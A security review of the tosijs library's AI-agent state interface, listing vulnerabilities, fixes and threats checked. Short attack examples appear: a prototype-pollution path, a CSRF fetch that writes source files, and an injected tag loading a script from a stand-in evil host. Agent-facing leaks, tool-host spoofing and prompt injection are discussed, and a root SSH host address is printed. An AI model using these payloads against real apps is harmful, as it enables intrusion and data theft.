# Security Review — tosijs 1.8.0-rc.1 (agent surface)

## 1. Verdict

**SHIP WITH FIXES.** No finding lets an attacker without prior origin code execution reach state through the *default* posture, but one path-traversal defect (SEC‑1) breaks the manifest boundary the whole feature is sold on, is not mitigated by contracts, and — via the shared `setByPath` sink — is reachable today by a hostile sync server or peer tab with no code execution at all. SEC‑1 through SEC‑4 should land before 1.8.0 final; the rest are follow-ups or doc fixes.

---

## 1b. Disposition (updated after the fix pass)

Everything in §2 has been acted on. Nothing was closed by argument; each fix
is pinned by a regression test that fails against the old code.

| # | Status | What shipped |
| --- | --- | --- |
| SEC‑1 | **fixed** | `assertSafeKey()` in `by-path.ts` refuses `__proto__`/`constructor`/`prototype` **at the sink**, so one guard covers `agent.write()`, the contract proposal clone, `share()` and `sync()`. Reproduced first (`Object.prototype` polluted while the registry stayed clean), then fixed. |
| SEC‑2 | **fixed** | Secrecy is a property of the **path**. Secret-bound paths are collected by a targeted scan that runs at enable time, at every `describe()`, and before every `read()`/`when()` — so a `tosi_read` that never called describe is redacted too, and an element walked before the password field can no longer harvest the value first. `read`, `changes`, `when` and **ancestor reads** all return `⟨secret⟩`. The ledger records paths and notes, never values. |
| SEC‑3 | **fixed** | `isSecretControl()` covers input/textarea/select, `type=password`/`hidden`, `autocomplete` `cc-*`/`current-password`/`new-password`/`one-time-code`, and the explicit `data-tosi-secret`. The unbound live-value harvest is gated on `!manifestMode`. |
| SEC‑4 | **fixed** | Scope comes from **provenance**, never the rendered string: only an in-manifest *path* handler sets `anyHandlerInScope`. A named plain function (`onClick: addItem` — our own documented idiom) no longer confers scope. |
| SEC‑5 | **mitigated locally + filed upstream** | `editableSources` is behind an env var; the vulnerable handler is tosijs-ui's, so it was filed, not fixed (see `UPSTREAM.md`). |
| SEC‑6 | **partially addressed, deliberately** | `javascript:`/`data:` sources are refused unconditionally and `settings.blueprintSrcCheck` is the opt-in policy hook; the doc block now states plainly that these tags execute what they name and must be stripped from user HTML. Same-origin-by-default would break documented CDN loading, so it is proposed as a 2.0 breaking change rather than an rc behaviour change. |
| SEC‑7 | **fixed** | The missing posture exists: `expose: { roots, write: false }` is the default — a manifest scopes **sight**, and writing is a separate explicit grant (`describe().writable` reports it). An unscoped read-only surface no longer auto-publishes `tosi_read`/`tosi_changes` to a WebMCP host (`allowReads` is the explicit consent, mirroring `allowWrites`), and the read-only notice names the global and the tools it publishes. |
| SEC‑8 | **fixed at the source** | Arrow tokens inside data are neutralized to `<->` / `<-` in bound values, harvested text and live control values, so a string can no longer forge an affordance. Docs corrected to last-occurrence parsing; the "unlikely in real data" claim is gone. The vendored renderer's own parse is [tosijs-floorplan#5](https://github.com/tonioloewald/tosijs-floorplan/issues/5). |
| SEC‑9 | **fixed** | A write is refused when it lands on, under, **or above** a declared action — `write('app', {})` can no longer wipe the action namespace. |
| SEC‑10 | **fixed** | Element ids are `CSS.escape`d (with a fallback and a try/catch), so one exotic id no longer blinds the whole map. |
| SEC‑11 | **fixed** | The receipt reports tools the host holds but cannot return; a narrowing re-registration overwrites dropped tools with a refusing stub, or errors loudly where the host won't allow it. `registeredOnHost` deliberately survives `disable()` — forgetting live tools would re-create the receipt lie. |
| SEC‑12 | **fixed** | A generated tool name missing from the receipt is now a `console.error` naming it and what it means; an optional `prefix` is the escape hatch. |
| SEC‑13 | **fixed** | `setContractValidator` warns when it **replaces** or removes an installed validator, `getContractValidator()` reads back what is installed, and `{ final: true }` makes later replacement throw. |
| SEC‑14 | **fixed** | Posture notices latch on the **posture**, not the process, so every transition into `'all'` announces. |
| SEC‑15 | **fixed** | `module.debug.js` and `module.safe.js` are in the smoke-import loop and the gzip budgets. (Their `types` pointing at `index.d.ts` is correct rather than wrong — both entries are `export * from './index'`; the extra bundle exports are `__tjs` metadata, not API.) |
| SEC‑16 | **addressed** | Deploy host and tunnel details read from the environment. |

Two items from §4 were closed rather than accepted: `call()` now records the
invocation in the audit ledger (a call-only surface used to have a blank
log — argument values are deliberately not recorded), and §3's scaffolder
defect is fixed (`<tosi-blueprint>` is emitted inside the `<tosi-loader>`
that actually drives hydration, in all four places, with the test
strengthened past a substring match).

The §5 doc items are done: the DOM-vs-state distinction, `global: false`,
the untrusted-content caveat, the corrected arrow-parsing rule, and the
removal of the stale "until contracts land" disclaimers — including the one
in the `tosi_write` tool description, which is text a model reads.

## 2. Confirmed findings

### SEC‑1 — Path segments walk the prototype chain: `agent.write()` escapes the manifest, and pollutes even when the contract refuses (major, fix before release)

**Location:** `src/by-path.ts:109-114` (`byKey`), `src/by-path.ts:243-253` (descent); reached from `src/agent.ts:1245` (`xin[path] = value`), `src/agent.ts:1198-1207` (contract proposal), `src/share.ts:275`, `src/sync.ts:219`.

**Attack.** With the documented production manifest `expose: { roots: ['app.cart'], contract }`, call `agent.write('app.cart.__proto__.isAdmin', true)`; `writable()` (`agent.ts:770-771`) only asks whether the path *extends* a declared root, and `extendsPath` (`path-listener.ts:120-125`) checks the boundary character, never the segment content. `setByPath` then descends via `byKey`, which returns `obj['__proto__']` — i.e. `Object.prototype`, since it is never `undefined` — and assigns the final segment onto it.

**Precondition.** Any write-capable surface (`expose: {roots}` or `expose: 'all'`) plus an actor supplying the path string *without* code execution on the origin: a WebMCP agent where the app opted into `allowWrites: true` (`webmcp.ts:162,175` forwards `String(input?.path)` unvalidated), or any app-built bridge forwarding a model-chosen path. Read-only default mode is safe (`assertMutable` throws first). Separately and unconditionally: `share.ts:275` / `sync.ts:219` apply **peer- and server-supplied paths** through the same unguarded sink.

**Impact.** Origin-wide prototype pollution from a caller confined to one state root; `Array.prototype` too via an array root. Every `if (opts.x)` in the app and in every library on the page is attacker-controlled. Three aggravations, all reproduced:

- The registry is untouched, so `describe()`/`read()` show nothing — invisible to the audit ledger.
- The proposal builder at `agent.ts:1198-1207` runs `setByPath` on the clone **before** `contract.check` at `:1210`. A contract that refuses *everything* still pollutes, then throws.
- Because the write lands on the prototype and not in the clone, the proposed root is byte-identical to the current one, so a realistic schema contract (`tosijs-schema` `agentContract()`) **validates it as legal** — the same surface that refused `write('app.cart.total','lots')` accepted `write('app.cart.__proto__.isAdmin', true)`.

**Minimal fix.** Reject `__proto__`, `constructor`, `prototype` as path segments during the descent in `src/by-path.ts` — one guard fixes `agent.write`, the proposal clone, `share` and `sync` at once. Change `byKey`'s existence probe from `obj[key] === undefined` to `Object.prototype.hasOwnProperty.call(obj, key)` so inherited members are never treated as containers. Belt-and-braces: validate the path shape at the top of `agent.write()` (`agent.ts:1177`) before the proposal is built. Pin with a test asserting `({}).isAdmin === undefined` after a manifest-mode write to `<root>.__proto__.isAdmin`.

---

### SEC‑2 — Secret redaction is DOM-only: the map withholds the password but publishes its path, and `read()`/`changes()` return the cleartext (major)

**Location:** `src/agent.ts:583-595` (detection), `:659-663` (`boundValue`), `:822-825` (`read`), `:1339` (`changes` → `read`), `src/webmcp.ts:105-128`.

**Attack.** `describe()` marks an `<input type="password">` `secret: true` and emits `"value": "⟷ app.login.password"` — value withheld, **state path published**. The agent then calls `tosi_read` with that path and gets the cleartext; `read()` is `assertScope` + `serialize` with no secret awareness. `tosi_changes` needs no path at all: it coalesces `{path, value}` for everything touched, so polling the drain once per turn harvests every settled secret.

**Precondition.** The default `enableAgentInterface()` (in read-only mode `inScope()` is unconditionally true, so `read()` covers the whole registry), or any manifest whose root is an ancestor of the secret. `tosi_read` and `tosi_changes` are in the **unconditional** base tool list (`webmcp.ts:105-128`) — only `tosi_act_*` (`:133`) and `tosi_write` (`:162`) are gated.

**Impact.** Genuine cross-principal amplification: browsers deliberately do not vend password-field values through the accessibility tree or screenshots, so the tool surface is exactly what converts a masked credential into something that leaves the origin to an external model host. And the code's own comment at `:583-586` states the invariant it does not hold — "must not travel to an agent, a log, a WebMCP host or a screenshot of the map." Threat model (d) squarely.

**Minimal fix.** Make secrecy a property of the **path**, not the record: collect secret-bound paths during the describe walk (or a small registry populated when a bound control is detected secret), then have `read()`, `changes()` and `when()` return a `'⟨secret⟩'` sentinel for any path at or under one — including inside ancestor reads, since `read('app')` currently returns the whole subtree in plaintext. The ledger should record the path, never the value. Correct the comment at `:583-586` to match reality.

---

### SEC‑3 — Secret detection covers three `<input>` autocomplete tokens; the unbound live-value harvest is not scope-gated (major)

**Location:** `src/agent.ts:580-599` (detection), `src/agent.ts:955-967` (harvest).

**Attack.** The entire detection block sits inside `if (record.tag === 'input')` and matches only `type === 'password'` or `autocomplete ∈ {current-password, new-password, one-time-code}`. Verified output: `{tag:"input",type:"hidden",value:"CSRF-TOKEN-123 ⟷ app.csrf"}`, `{tag:"input",value:"4111111111111111 ⟷ app.card"}`, `{tag:"textarea",value:"private notes ⟷ app.notes"}`. Worse, the harvest at `:955-967` is **not scope-gated**: with `expose: {roots:['pub'], actions:['pub.go']}`, an element whose data binding was dropped as out-of-scope at `:874` but which carries an in-scope handler still had its live DOM value harvested — `{tag:"textarea",on:{change:"pub.go"},value:"private notes"}` — while `read('app.notes')` correctly threw *"not exposed (manifest mode)"*.

**Precondition.** Any mapped app with a hidden token field (near-universal) or a payment/PII field that is not literally `type=password`; for the scope bypass, manifest mode plus an element wired by an in-scope handler.

**Impact.** CSRF tokens, session ids and `autocomplete`-classified PII travel to the agent host, into `log()`-adjacent transcripts and into rasterized schematics. The scope bypass defeats the allowlist that `trust-and-transports.md:36-41` names as *the* control for secrets and PII.

**Minimal fix.** (a) Scope-gate the harvest — emit a live value only when the element has an in-scope data binding, or when `!manifestMode`. (b) Lift the secret test out of the `tag === 'input'` block; key it on `type === 'password' || type === 'hidden'` plus an autocomplete prefix test (`/^(cc-|current-password|new-password|one-time-code)/`), applied to `input`/`textarea`/`select`; add a `data-tosi-secret` author opt-in and document the denylist as defence in depth, not as the control.

---

### SEC‑4 — A named plain-function handler confers "in scope", defeating the manifest for reads (major)

**Location:** `src/agent.ts:918-947`, consumed at `:951-967`.

**Attack.** `describe()` filters data bindings by `inScope` (`:874`) and reduces out-of-scope by-path handlers to `'ƒ'` (`:922`), but derives `anyInScope` from the *rendered strings*: `.some((name) => name !== 'ƒ')` (`:944-947`). A raw function handler whose name does not match `/^(on|handle)[A-Z]/` renders as `ƒ addItem`, which is `!== 'ƒ'`, so `wired = true` — and a plain function by construction has no path and can never be in-manifest. The record then falls into the unconditional harvests at `:951-954` (textContent) and `:957-967` (live control value).

**Precondition.** Manifest mode plus the project's **own documented idiom** — `button({ onClick: addItem })` appears in `src/xin.ts:816`'s To Do example and `src/color.ts:126`. Minification does not save it: a renamed function's `.name` is still `!== 'ƒ'`.

**Impact.** Verified with `roots: ['q.cart']`: `describe()` emitted `{tag:'input', on:{input:'ƒ addItem'}, value:'4821-9930-1177'}` and `{tag:'span', ..., text:'4821-9930-1177'}` for elements bound to `q.secret.pin`, a path `read()` correctly refuses. Control case with an anonymous handler produced `wiring: []`, isolating the naming path as the sole cause. This is exactly the defect the comment at `:911-917` claims to have fixed. `tosi_describe` is registered unconditionally, so the payload crosses to the model-context host.

**Minimal fix.** Derive scope from provenance, not the display string: set a flag inside the `names` map only when `typeof h === 'string' && inScope(h)` (or when `tosiPath(h)` resolves in-scope), accumulated across event types. Named-function breadcrumbs can stay in `on` without conferring scope.

---

### SEC‑5 — Dev-server source-write endpoint is CSRF-able (major; upstream `tosijs-ui`, not shipped code)

**Location:** `tosijs-site.config.ts:72` (`editableSources: true`, tracked); `node_modules/tosijs-ui/dist/doc-system/site/dev-server.js:432,452-474,1074-1111`; `dev-auth.js:164-167`.

**Attack.** While `bun start` runs on `https://localhost:8018` with the locally-trusted dev cert, any page the maintainer visits can `fetch('https://localhost:8018/__docstore/source', {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body: JSON.stringify({file, content})})`. `text/plain` is CORS-safelisted, so no preflight; `handleWriteSource` calls `await request.json()`, which parses the body regardless of declared content type (verified empirically against Bun.serve). `mayWriteSource` short-circuits to `isLoopbackAddressForAuth(peer)` for non-tunnel traffic, ignoring the session cookie entirely, and there is no `Origin`/`Referer`/`Sec-Fetch-Site` check anywhere on that listener.

**Precondition.** `bun start` running (the documented everyday command) and the maintainer browsing in the same browser. No token, no session, no code execution. Chromium's Private Network Access blocks it today (no OPTIONS handler → 405); **Firefox does not**, and `mkcert -install` populates Firefox's NSS store.

**Impact.** `resolveInRepo` confines to the repo root but does not exclude dotfiles — `.git/hooks/pre-commit` is writable, which is direct local code execution with no maintainer mistake required. The slower path (modify `src/*.ts`, maintainer commits, `bun run build`, `npm publish`) is a supply-chain compromise of the package. **Not a 1.8.0 regression** — `editableSources: true` landed in v1.7.6 on main, and the vulnerable handler is in `tosijs-ui`, so nothing here ships to consumers.

**Minimal fix.** Locally: `editableSources: process.env.TOSI_EDIT === '1'`. Upstream: on the `/__docstore/source` route, require `Sec-Fetch-Site: same-origin` (browser-set, unforgeable by page JS) in addition to the loopback check, and reject bodies whose `Content-Type` is not `application/json` — the latter alone kills the no-preflight path.

---

### SEC‑6 — `import 'tosijs'` arms an HTML-injection → arbitrary-script-execution sink (major; pre-existing, not agent-surface)

**Location:** `src/blueprint-loader.ts:250,295-320,325,333,337-343`; `src/index.ts:9-18`.

**Attack.** `<tosi-loader><tosi-blueprint tag="x-y" src="https://evil.example/x.js"></tosi-blueprint></tosi-loader>` injected into innerHTML fires `BlueprintLoader.connectedCallback` → `settleBlueprints` → `packaged()` → `loadModule(src)` = bare `import(src)`, with no origin check, allowlist, Trusted Types hook or warning. Both classes register at module scope and are re-exported unconditionally, so importing the library arms the sink; `tosijs/core` genuinely omits it.

**Precondition.** HTML injection with attribute retention and a sanitizer that admits unknown custom elements. Note the report's framing was backwards: DOMPurify and sanitize-html **strip** these by default; the attack needs a denylist sanitizer or a deliberate `CUSTOM_ELEMENT_HANDLING.tagNameCheck` config — plausible for a web-components-in-CMS app, not the default posture.

**Impact.** Verified end-to-end in real Chromium over http: one network request to the attacker module and `window.PWNED === true`. HTML injection → arbitrary JS on the origin. Unchanged since xinjs (only the tag names changed in 1.8.0), and once the module runs it can assign to `xin` directly — the agent surface adds nothing to the impact.

**Minimal fix.** Follow-up, not an rc blocker: gate `loadModule` behind a source policy (default same-origin plus an author-supplied `settings.blueprintSrcCheck` predicate), refusing and `console.error`-ing otherwise; document in the blueprint-loader doc block that these tags must be stripped from user-supplied HTML.

---

### SEC‑7 — The "safe default" installs a global read-everything handle and auto-publishes `tosi_read`/`tosi_changes` over the whole registry (minor, posture gap)

**Location:** `src/agent.ts:703` (`global = true`), `:733` (`readOnly = !manifestMode && !exposeAll`), `:762-765` (`inScope` always true without a manifest), `:1387-1390`, `:1398-1433`; `src/webmcp.ts:105-128`.

**What is true.** `enableAgentInterface()` with no options installs `globalThis.tosiAgent` and, where `document.modelContext` exists, registers `tosi_describe`, `tosi_surface`, `tosi_read`, `tosi_changes` — verified tool set — with reads unscoped over the entire registry, `serialize()` being a full JSON clone of any subtree.

**What is *not* a finding.** The third-party-script framing is excluded by this review's own ground rule: a `<script>` on the origin already has arbitrary JS and can hook `fetch`, read `localStorage`, subscribe to `share.ts`'s BroadcastChannel or read the DOM. `globalThis.tosiAgent` makes state access tidier, not newly possible. The surface is also OFF until the author explicitly calls the function, and the breadth *is* disclosed — the runtime notice says verbatim "work over everything," the doc block annotates the no-arg call "expose everything," and `global` is a documented option.

**What survives.** A browser agent is a different principal, so publication to `document.modelContext` is a real cross-boundary disclosure with no opt-in beyond the one call. And the surface **offers no posture expressing "scoped reads, no writes"**: because `readOnly = !manifestMode && !exposeAll`, narrowing reads with `expose: {roots}` simultaneously makes those roots writable. The only two reachable postures are unscoped-read and scoped-read-plus-write — the safest-sounding one is the widest read.

**Minimal fix.** (1) Let a manifest scope reads without conferring writes (`expose: { roots, write: false }`, or invert so writes need an explicit flag). (2) In read-only mode, either skip WebMCP auto-registration or omit `tosi_read`/`tosi_changes` unless roots are declared, mirroring the existing `allowWrites` gate. (3) Extend the read-only notice at `:737-742` to name `globalThis.tosiAgent` and the registered tools, in the same words the `expose: 'all'` warning already uses at `:746-751`.

---

### SEC‑8 — Provenance arrows are forgeable from any attacker-controlled string (minor, format integrity)

**Location:** `src/agent.ts:659-669` (`boundValue`), `:950-953` (static text harvest); consumers `src/schematic.ts:211-217,444,473`, `src/audit.ts:88-91`.

**Attack.** `boundValue` builds `"<value> ⟷ <path>"` by concatenation with no escaping. A bound string containing `' ⟷ '` forges an arrow: state value `'confirmed ⟷ spoof.orderStatus'` produced the record field `"text": "confirmed ⟷ spoof.orderStatus ⟵ spoof.note"`. The static-text harvest at `:952` is wider still — plain page text forges the token with no binding involved. The docs instruct consumers to split on the first arrow and assert the tokens are "unlikely in real values."

**Impact.** tosijs's own consumers mis-parse it: `schematic.ts:213-216` uses `indexOf`, so a forged arrow truncates the shown value, and `schematic.ts:444/473` plus `audit.ts:88-91` decide editability/interactivity by `.includes(BOUND_TWO_WAY)` — a forged arrow draws a false affordance and produces bogus a11y findings. **No access-control bypass**: `write`/`call` enforce scope by path independently of the map.

**Minimal fix.** Strip/replace both tokens in `shown` at `:665-668` and in static text at `:952` — fixes every consumer at the source. Switch `schematic.ts:213-216` to `lastIndexOf` for already-emitted maps. Correct `agent-surface.md:145-147` to specify last-occurrence parsing and drop the "unlikely in real data" assurance. Longer term, emit provenance as fields (`{value, path, writable}`) and keep the arrow string as display sugar.

---

### Lower tier (verified mechanics, low impact — fix opportunistically)

| # | Issue | Location |
|---|---|---|
| SEC‑9 | `write()` can clobber a declared action when the action lives under a declared root — `writable()` consults roots only, contradicting its own comment. `agent.write('app.checkout', 'x')` disables the action; `write('app', {})` wipes all of them. Fix: `writable` also refuses paths at/under/containing a declared action. Existing test only pins the disjoint case. | `src/agent.ts:768-771`; test gap `src/agent.test.ts:250,264` |
| SEC‑10 | `describe()` throws and the whole map goes blind if any element `id` contains `"` or `]` — `label[for="${el.id}"]` is interpolated raw into `querySelector`. Availability DoS on `tosi_describe`, the audit and the schematic. Fix: `CSS.escape`, or iterate labels; wrap `describeElement` in try/catch so one bad element degrades to a partial record. | `src/agent.ts:526-537`, called bare at `:865` and `:1098` |
| SEC‑11 | A revoked `tosi_write` stays live on hosts without `unregisterTool`, and `agent.webmcp.tools` under-reports it. Fix: include already-held names in the receipt; warn or overwrite with a refusing stub when re-registration narrows posture; clear `registeredOnHost` on `disable()`. | `src/webmcp.ts:193,215-216,257` |
| SEC‑12 | WebMCP tool names are unnamespaced; a script registering `tosi_read` first keeps it, and the only signal is a `console.warn` classifying the host's refusal as a duplicate. The receipt is honest but nothing checks it. Fix: escalate a receipt/expected-set mismatch to `console.error`; optionally support a per-surface prefix. | `src/webmcp.ts:68-69,215-243`; `src/agent.ts:1431-1433` |
| SEC‑13 | `setContractValidator` is a process-global, last-writer-wins, no announcement, no read-back — one line from a bundled dependency neuters every contract in the app, and `warnIfFailsOpen` is suppressed precisely because *a* validator is installed. Built-in `type`/`enum`/`const` still run. Fix: warn/throw on replacement, expose `getContractValidator()`, support a `{final: true}` lock. | `src/contract-check.ts:6-13,37,82-85` |
| SEC‑14 | Posture notices are module-level once-per-process latches, so the documented dev workflow (`'all'` → manifest → `'all'`) announces the full-access posture only once. Fix: latch per surface, or key on the posture so each transition into `'all'` re-announces. | `src/agent.ts:681-694,744-746` |
| SEC‑15 | `tosijs/debug` and `tosijs/safe` are published entry points with **no build gate** — absent from the smoke-import loop and the size budgets, and built by the least-trusted toolchain. I ran the missing probe: both import cleanly today, but debug exports 121 names vs module.js's 81, and both declare `"types": "./dist/index.d.ts"`, which describes neither. Agent posture is identical across all four bundles (checked). | `package.json:15-23`; `bin/site.ts:219,292-298` |
| SEC‑16 (nit) | Root SSH target for the preview host is in a tracked file in a public repo: `host: 'root@212.147.248.15'` plus tunnel port and edit-workspace hostname. No credential is exposed; it removes the recon step. Fix: read from env or an untracked local config; deploy as non-root. Verified the npm tarball is clean — 71 files, no `.npmrc`, no keys, no `/Users/` paths in sourcemaps. | `tosijs-site.config.ts:88-95` |

---

## 3. What was checked and found clean

This is the record that the lens ran. Each class was probed by reading the code and, where a claim was behavioral, by executing it.

**Prototype pollution — FOUND (SEC‑1).** Probed `agent.write`, the contract proposal builder, `share.applyInbound`, `sync.applyInbound`, `xin`'s set trap, `contract-check`, and the WebMCP write tool. Grep for any `__proto__`/`constructor`/`prototype` key guard across `agent.ts`, `by-path.ts`, `xin.ts`, `contract.ts`, `contract-check.ts`, `webmcp.ts` returns nothing; the only `hasOwnProperty` call in `by-path.ts` is a delete guard at `:255`. Also confirmed read-only mode is correctly safe (`assertMutable` throws before the sink) and that array/id-path shapes (`app.docs[0].__proto__.x`, `constructor.prototype` through an id-path) are equivalent routes.

**Scope evasion in the state verbs — CLEAN.** `read`/`write`/`observe`/`when`/`call` all funnel through `assertScope`/`writable`/`assertMutable` (`agent.ts:762-791`), and manifest mode correctly refuses out-of-scope reads, writes and calls. `call()` re-checks the action allowlist at `:1263-1267`. The only scope evasions found are on the **describe** side (SEC‑3, SEC‑4), not the state side.

**Scope evasion in `describe()` — investigated at length, mostly by design.** Links (`:970-972`), contenteditable regions (`:975-981`), the structural tier (`:1082-1117`) and contract-declaring custom elements (`:1010-1012`) all set `wired` with no manifest test, and the walk is `document.body` when no `scope` is passed. **This is not a security defect**: every datum is DOM-derived (attributes, `textContent`, live control properties — the registry is never consulted), the walk uses `querySelectorAll` and does not pierce shadow roots, and `aria-hidden` is honoured (`:862`). Any consumer of `describe()` already has strictly greater access to those same facts. The `expose` manifest is documented as a **state-path** boundary (`:174-181`); DOM narrowing is the per-call `describe({scope})` option (`:369-376`). What is real here is a wording gap, not a leak — see §5. Contrast with the handler bug the team fixed at `:912-947`, which leaked **registry namespace** (`app.secret.wipe`), unobtainable from the DOM — that class is genuinely dangerous, and SEC‑4 is the surviving instance of it.

**Exfiltration paths — FOUND (SEC‑2, SEC‑3).** Traced every value-bearing exit: `read` → `serialize`, `changes` → `read`, `when`, `observe`, `log`, the describe record fields, and the WebMCP tool set. `log()` itself stores only `{seq, path}`, never values — correct. `serialize` returns `undefined` for functions, so no function body escapes. The two real leaks are the cosmetic secret redaction and the unscoped live-value harvest.

**Tool impersonation and host spoofing — investigated, one real nit (SEC‑12), one refutation worth recording.** A page script *can* spoof `document.modelContext` (`webmcp.ts:199-203`, no provenance check) and receive the whole tool set including `execute` closures, defeating `global: false`. I reproduced it. **It is not a finding**, and the refutation is instructive: the precondition is script execution *before* `enableAgentInterface()`, and such a script has a strictly better attack available with no agent surface at all — `src/xin.ts:1393-1396` builds `xin = new Proxy(registry, …)` at module eval using the **global** `Proxy` constructor, so a head script that shims `globalThis.Proxy` captures the raw registry object itself. Verified end-to-end: full read, write and arbitrary function invocation over the entire registry, without `enableAgentInterface()` ever being called. `global: false` was never a boundary against a pre-init page script, and it is documented nowhere as a mitigation. Residual hardening only: skip auto-registration when `global === false` or when read-only, and correct the JSDoc at `agent.ts:191-197` claiming the webmcp default is "a no-op where no host exists" — any page script can supply the host.

**Prompt injection into agent context — CLEAN as a framework concern.** `describe()` does pipe unbounded, unmarked page and state content into the map (`boundValue` uncapped at `:659-669`, `referencedText` uncapped at `:512-521`, static text capped at 40 chars at `:952`). This creates no channel the attacker lacked: the harvested content is what the app already renders, which any in-page or WebMCP agent reads via the accessibility tree, page text or a screenshot. Capping `describe()` would also move nothing while `read()` returns uncapped serialized state. The one genuine artifact of this class is the *structured* forgery in SEC‑8. Untrusted tool output is a host-side obligation, correctly framed as such in `trust-and-transports.md:42-47`.

**Denial of service on the surface — one found (SEC‑10), one cleared.** `disable()` is an unauthenticated method on the shared global, but no privilege is amplified: the global is a plain writable assignment (`agent.ts:1389`) that any script can overwrite or pre-plant regardless, and the WebMCP context can be wiped by calling `document.modelContext.provideContext({tools: []})` directly with tosijs absent. Self-limiting denial of a debug affordance on a page the attacker already owns.

**Contract-seam integrity — CLEAN except via SEC‑1.** Probed the ancestor-write case (a write to an ancestor of a contracted root gets no proposal, `agent.ts:1191-1193`). Core does **not** bypass the contract — `contract.check(path, value, proposal)` runs on every write with the real path and value; only the convenience proposal is absent, and the blessed adapter fails closed on exactly this (`../tosijs-schema/src/contract.ts:328-334`, pinned by its own test). The ledger does record the ancestor write. The only contract bypass that works is SEC‑1, which is a path defect, not a seam defect. `call()` is genuinely uncontracted, but no shipped API can express an argument schema — that is an unimplemented feature, and both `agent-surface.md:267` and the generated tool description say plainly that arguments pass through positionally.

**Auto-registered action tools — CLEAN.** `tosi_act_*` registers only when `exposure !== 'read-only'` (`webmcp.ts:133`); in manifest mode the list *is* the author's allowlist, and in `expose: 'all'` the same capability is already unconditionally reachable via `globalThis.tosiAgent`. Name collisions are disambiguated (`webmcp.ts:139-145`). The description string `"the same function the UI is wired to"` is factually wrong for an unwired helper picked up by the depth walk (`agent.ts:1125-1136`) — an honesty nit worth a one-line reword, not a vulnerability. MCP annotations (`destructiveHint`) would not help: the spec classifies them as untrusted hints, and here the "server" is the same page that is the injection vector.

**Supply chain — CLEAN in-repo; one dev-tooling defect (SEC‑5).** Checked `vendorSchematic()` (`bin/site.ts:43-84`), which splices `tosijs-floorplan` source into tracked `src/schematic.ts`. Not a finding: the package is pinned exactly (`package.json:81`, not a caret), `bun.lock:316` carries its sha512, it is only `.text()`-read and never executed at build time — unlike `tosijs-ui` and `tjs-lang`, which *are* the build and write directly into `dist/`. Vendoring *increases* the review surface (the bytes appear in the release diff; a compromised dep's payload appears in no diff at all). npm tarball verified clean. The real supply-chain exposure is SEC‑5, and it is upstream.

**Published-artifact parity — CLEAN, gate gap noted (SEC‑15).** Verified agent posture behaves identically across `module.js`, `main.js`, `module.debug.js` and `module.safe.js`: read-only default refuses writes, manifest mode refuses out-of-scope read and write, in-scope write is allowed.

**Scaffolder output — one correctness defect.** `bunx tosijs create blueprint` emits `<tosi-blueprint src=…>` with no enclosing `<tosi-loader>` (`bin/cli.ts:225,239,177`), and `Blueprint` has no `connectedCallback` — the generated app renders nothing, silently, and ships the broken snippet into the user's published README. The test gate (`src/cli.test.ts:76-78`) only substring-matches. Fix: add the wrapper in all three places; strengthen the test to assert the loader or the actual registration.

---

## 4. Residual risk accepted by design

Users should know these are true, intended, and not going to change:

1. **A same-origin script can reach everything.** `globalThis.tosiAgent` is a convenience, not a boundary. Any script on the page already has the registry via the `Proxy`-shim route above, plus `fetch` hooking, `localStorage`, the `share()` BroadcastChannel and the DOM. The agent surface's threat boundary is the **agent**, not the page.
2. **`describe()` maps the whole page.** In every mode, the map includes headings, landmarks, links with `href`, contenteditable text, labels, placeholders and geometry for the entire body — not just manifest-covered regions. The manifest scopes *state*, not the DOM map; `describe({ scope })` is the DOM knob, and the WebMCP adapter currently hardcodes a scope-less `describe()` (`webmcp.ts:93`).
3. **Read-only mode reads everything.** By design and announced on the console. It is the safest *verb* posture and the widest *read* posture simultaneously.
4. **`call()` passes arguments through unvalidated.** Declaring `actions: ['app.transfer']` authorizes an agent to invoke that function with arbitrary arguments. Argument validation belongs inside the function, as it would for any handler an agent can reach by driving the DOM.
5. **Contracts gate `write()` and the Component value setter, not `call()`.** No shipped API expresses an action-argument schema.
6. **A call-only surface has a near-empty audit log.** With `roots: []`, `inScope` matches only paths under the declared actions, and the ledger observer (`agent.ts:815-819`) records only in-scope touches — so state the action mutates is invisible. Recording the invocation inside `call()` would close this cheaply.
7. **`<tosi-loader>` / `<tosi-blueprint>` are a code-execution feature.** That is their purpose. Any HTML that reaches `innerHTML` from an untrusted source must have them stripped.

---

## 5. Recommendations for the docs

1. **State the DOM/state distinction in one sentence, prominently.** "`expose` scopes what the surface may *read, write and call as state*. It does not scope the *map* — `describe()` walks the whole page. Use `describe({ scope })` to narrow it." Today `agent-surface.md`'s "In production, expose only what you declare" reads as covering both, and the code filters bindings and handlers but not links, editables or structure. This is threat model (d) in its purest form.
2. **Tighten the CHANGELOG posture table.** `CHANGELOG.md:75-81` describes read-only mode purely as "write() and call() refuse." It must also say: every state root becomes readable, `globalThis.tosiAgent` is installed, and `tosi_read`/`tosi_changes` are published to the browser's tool registry where one exists.
3. **Document `global: false`.** It appears only in `src/agent.ts:191`'s one-line JSDoc and in tests — zero mentions in `agent-surface.md`, `one-user-interface.md` or the `/*# */` doc block. Also fix the scaffolder (`bin/cli.ts:313-327,342-348`), whose generated comment contrasts the manifest form against `expose: 'all'` ("a global any script on the page can reach") in a way that implies the manifest form is *not* page-reachable. It is — and in a scaffolded app `roots: ['app']` is the entire state tree, so the narrowing is nil.
4. **Say plainly that `secret: true` is a map-level annotation, not a state-level guarantee** — until SEC‑2 is fixed. Right now `AgentWiringRecord.secret`'s doc (`agent.ts:239-241`, "its VALUE is never emitted") and the comment at `:583-586` both assert a property the surface does not have.
5. **Remove the stale contract disclaimers.** `trust-and-transports.md:28` ("Until contracts land…"), `src/webmcp.ts:40-43`, and the `tosi_write` tool description at `webmcp.ts:169-170` ("writes are unvalidated until state-level contracts land") are all false when a contract is configured — and that description is text a *model* reads.
6. **Fix the arrow-parsing instruction.** `agent-surface.md:145-147` tells consumers the tokens are "unlikely in real values" and to split on the first occurrence. Both are wrong (SEC‑8); specify last-occurrence parsing until provenance moves to structured fields.
7. **Add a one-line note that `describe()` returns live user- and peer-supplied content**, to be treated as data, never as instructions — the standard untrusted-tool-output caveat, which a state library can document but cannot enforce.

---

**Suggested fix order before 1.8.0 final:** SEC‑1 (one guard in `by-path.ts` also closes `share`/`sync`), SEC‑4 (a few lines in the `anyInScope` derivation), SEC‑3a (scope-gate the harvest), SEC‑2 (secret path set), then the doc items in §5. SEC‑5 locally (`editableSources` behind an env var) plus an upstream issue. Everything else is a follow-up.